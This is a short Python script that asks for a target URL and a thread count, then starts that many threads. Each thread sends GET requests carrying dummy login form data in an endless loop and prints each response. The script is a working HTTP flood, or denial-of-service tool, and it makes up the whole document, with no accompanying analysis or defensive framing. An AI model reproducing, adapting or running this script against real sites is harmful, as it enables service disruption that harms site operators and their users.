import requests
import threading


class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
   CWHITE  = '\33[37m'


url_target = input(color.GREEN + "Enter the url target: ")
number_of_threads = input("Enter the number of threads: ")

data = {
    'username': 'sdada',
    'password': 'dasdada',
    'remember': 'remember',
    'submit': '',
    '_jafo[activeExperiments]': '[]',
    '_jafo[experimentData]': '{}'
}

threads = []

def do_req():
    while True:
        response = requests.get(url_target, data=data)
        print(response)

for i in range(int(number_of_threads)):
    t = threading.Thread(target=do_req)
    t.daemon = True
    threads.append(t)

for i in range(int(number_of_threads)):
    threads[i].start()

for i in range(int(number_of_threads)):
    threads[i].join()